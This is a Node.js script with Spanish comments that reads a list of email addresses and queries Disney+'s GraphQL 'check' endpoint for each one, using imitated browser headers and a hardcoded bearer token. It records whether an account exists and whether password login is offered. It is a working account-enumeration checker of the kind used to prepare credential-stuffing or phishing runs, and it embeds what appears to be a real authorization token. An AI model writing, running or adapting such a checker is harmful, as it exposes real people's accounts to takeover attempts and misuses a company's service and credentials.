import fs from "fs";

// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails2.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..MSW2RZPVn8gJMvvg.PzeJIPY_0jeb9e0CDxTDCs37NIlbc_hgteVlqCi17RM8Wvb77x172ez5TsLSdAEH_lRbKoAoJIs2uP33SUiopI1doxUI3OSYjhWkV1f04X6yuGXr1qRRz6MvsJS8pzY2jXwHiRj9T4wmQCdGzK4nmNfRLTyo4-WdjyAf2MBEzAzrqcSeonTCkqxgYB61ijeaRxeeLY6r99DeeC1YIEdj4E0emsVZHI8LsqVtl_ySLJytFHmfoODrySlNiB8SN020uDR_yi9f5bmMP61WqZaWVrT6qRS7m9mx-Tup8aHpOPP7Cu1BqtvcNiQ2Ql3oenUihFt_H10l1JHmCAu6B-Ybf6tZhF2l6-iCC5_b2z5jbUgGb2yNhVMSLy_kwyE257G_BaFkhqhKTVEdy6-SbO9eCXGs-7txI1_eFcyRu-7_11EW1gAcCIXWlKp2b5pS_qfCjL855sqowmSZMfhCqsTlTjW-m13ptZCQR_6Dof9A8r8yl8t3vYfVJfJZCf_6qO7GTmy3ZH5A1Gr7At1kzHLYJMja0gFuvXD1z9OYDQrhh08tKpelLd4k33MuXBCRTnK7vYBracu0w3RRgWaCSS6PlW4e8zeo9SidByFawg8hfNTKlWd76xGuBUZoYae7WiCb_SPizKb4OHnucrMfJzCGlvdclbmKDqLQf1wZGjGbz1-jnP4-U7lH8nmN2qmwKyvipn0wN44Osy7acF5LUB8GSQXXxqJ0TQcN4UUEM97lNlaOYaJZ9R5I4Rn-0Ksmjdja0h_vUtjCtPalvSONTqRqd_JPq4YrH5CJA_I0ajYWVkupyeNRmHvxtGRRzRRsfB52j64PCCvQhKzCGzULrUeV72iIynb6j5CQHhy9y2hbBUJfjALjD0Nf13b-KvMIKzmvKZwQd8EKMpOHKzw7VLCfptasoQ6iuSiDv02A83IEqQ8m-275KGB2y5JqBCvEGXIItvbIfjOHIxcGRJhMWKG9g_0PmEYH0nEhEgd5yjMnmSpNtlXC6Qwv76wCm0wPbMTvkpvWAWXaj2yOZBFSzgGYHSghmU80_-J2a01Xwqlho27ukJMoFMaq_1uixc1eADccaA0_8IMl56eMNa4nH5QXLoZj9zPtkvt8MVxofst5uG7ZynlN1CzCOWohsyXTgwLlCEpE05thJLWyc7YLdkGCRpPEEH4Xng_nPTcxb24zmeHHl24dBbsOuEApTGRV-vGzv4uTppLdbPlRZO3z6Amuth5NKnqyYdOZ8kGcAyqKS126QuWKKs7vsRNiZjzTGomlObhOaRVhYqekAXYiT3IL-3mw6y2L3extvb0xHofQ9J9rPpQUbJuetytAYezVTopx9M74gNYRYkNIcJ8MYsNNpsFuoUNzd86PVgaWM8P6rB_82j-NwvXPM5M61nIaqzVsir5LTD-VQ51561vF3ZZ3lEl0MZyoxZS2OU5J0zohGegjkG8fC5EywboWB-zDdgQIy_BOZm7JUIT6YeGqDe4vww_xkT5HuChNr4r_DviHNuYDu2qEHzb5gjGlZmjWWodp1TltjlDTYAaqpWQ5GQvXge1zmlSRf40ya-FiPll_T_pm2F224BVtfQBXyO9w4Vu1tp4Ck5bRCJXPA06S7g7YrR7HGWC8BXRm_Zwm_2XHHl1IJhHy7kghoIEDXEx3rIg6VLl0n3rp7mMML0NexswkDTCy1gubQJ-rfWFhB_msLw4FhI-fulJnJ2-J6HTQQY52dxMIGXZBQQbyMWJ3LHwGj4ZePIGcZJVV9nm5N0YGmW8r6y2rlMuFzx-UoiiRY3WEyUzHbX4GxYIOAANpdMSSKJcxbId8lkWCh3aaEIbqmlxxmey899vgpGisNGSG8_ORFQHPjF6OQ8XwChFD4uQHlHiuxSeKEwTEnBOPuXXRlxpcd1n075e8aU5ORF4O6_4HQdBrJn1zKQ5LLz14QESqKL5hTY0UKg6QUM8zLFi9Tn1Rw0brBNEga2QSbQUWJLKlc3pG8hPXgG2V5Pu1e5h5nd5srObwDCHBL-TUU6I4Rhj_Go5QlyWZc9v9rSYF4Hj6Tqz2FLrz2RvHjM6UEUcqAxNiS0uiUv3LPRXOY9CmmI2zX6gMkP1c-WkbNwrSY9pgWYwSbnBVn6sfbVDvQnybOTY4adxsKjZqb-U9uedBQHbXWZ5WT2uYWkIBYF4Tg407U0u36Eywk3JEShomW1ngHLANj-4vkt0Hi4v25gC7vCacQG9Q4hoy2QzrwzZikcv1JAooE_953luIEBrGDcdNeiIJpOGcMcwbV0jaKaO_gGxBU8V9aV8ru4x9wtKR6IB_zCxJeWLYDDae2zZdKZxJEMHLbzuptjJgzg6rDaAdWNUkG8Tu7P6YZ0Mc12b9jJF0LAfFvFyKA66Rqbni3CBeYwMnnEA6Wza6Abc2xPkfeGCATRmVktcZ7BzZCLZbl5HoVFpJ8onKVjCaHnuFGd9CBzzGLUynMbQvkyjjPFJeaFSTX-VdirQXOcsnXfdiqqlBFK4QA1XxrIai9yzMtQDSH_VMgb7WwFuY3vEDOoVKqFxKGFnLJK0DpTzGwzMpwLMuKMP8kRIGiXP0WVwbvgH3O0sJudH3tFJI4zhh76W0TUuRIlMjVaJgubWn.D72qjtSAL6pgnX-KMqLYHw"

const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
for (let i = 0; i < emailsALeer.length; i++) {
    const correoFormado = emailsALeer[i];

    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if (result.noError) {
        if (result.exist === true) {
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        if (result.exist === false) {
            console.log((i + 1) + " no existe")
        }
    }

    if (result.noError === false) {
        if (result.serverError) {
            console.error("🖥🖥🖥🖥 Error servidor: " + result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: " + result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }
    try {
        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                        if (jsonResponse.data.check.operations.includes("Login")){
                            result.login=true
                            console.log("LOGIN")
                        }else{
                            result.login=false
                        }
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if (result.exist === null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}